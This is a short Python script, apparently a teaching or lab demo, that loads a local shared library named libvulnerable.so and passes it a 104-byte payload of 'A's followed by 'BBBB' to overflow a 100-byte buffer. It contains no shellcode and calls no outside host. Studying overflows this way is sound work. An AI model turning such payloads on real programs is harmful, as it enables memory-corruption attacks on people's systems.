# main.py
# This is the main file for the buffer overflow attack program.
# It sets up the target buffer and calls the vulnerable function.

import ctypes

# Load the shared library containing the vulnerable function
libc = ctypes.CDLL('./libvulnerable.so')

# Define the buffer size
BUFFER_SIZE = 100

# Define the payload to overflow the buffer
payload = b'A' * BUFFER_SIZE + b'BBBB'

# Call the vulnerable function with the payload
libc.vulnerable_function(payload)

print("Buffer overflow attack executed.")